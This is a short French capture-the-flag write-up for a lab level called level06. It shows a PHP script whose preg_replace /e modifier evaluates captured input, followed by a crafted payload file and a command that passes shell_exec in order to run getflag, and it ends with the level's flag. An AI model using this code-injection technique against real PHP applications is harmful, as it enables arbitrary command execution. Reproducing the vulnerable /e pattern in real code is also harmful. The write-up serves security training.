<pre>
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
<strong>    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);</strong>
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
</pre>
- On remarque que **/e** permet d'executer se qui est recuperer dans le regex et que c'est une faille de securité connu
- Grace a un [post stackoverflow](https://stackoverflow.com/a/43759648) on peut comprendre comment ca fonctionne
- /tmp/toto.php
```
[x {$z(getflag)}]
```
- On lance donc `./level06` avec notre fichier php et la function shell\_exec en deuxieme parametre
```
./level06 /tmp/toto.php "shell_exec"
```
- flag: `wiok45aaoguiboiki2tuin6ub`
